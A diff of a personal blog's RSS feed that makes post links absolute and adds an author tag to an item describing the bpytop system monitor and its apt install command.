@@ -2482,9 +2499,10 @@ nmap -sP 192.168.1.0/24 Script para automatizar o processo de Scan em hosts ativ
     </item>
     <item>
       <title>bpytop</title>
-      <link>/posts/bpytop/</link>
+      <link>https://fxshelll.github.io/posts/bpytop/</link>
       <pubDate>Sat, 09 Mar 2019 16:00:36 UT</pubDate>
-      <guid>/posts/bpytop/</guid>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/bpytop/</guid>
       <description>
 Monitor de recursos que mostra uso e estatísticas de processador, memória, discos, rede e processos. https://github.com/aristocratos/bpytop
 sudo apt install bpytop </description>
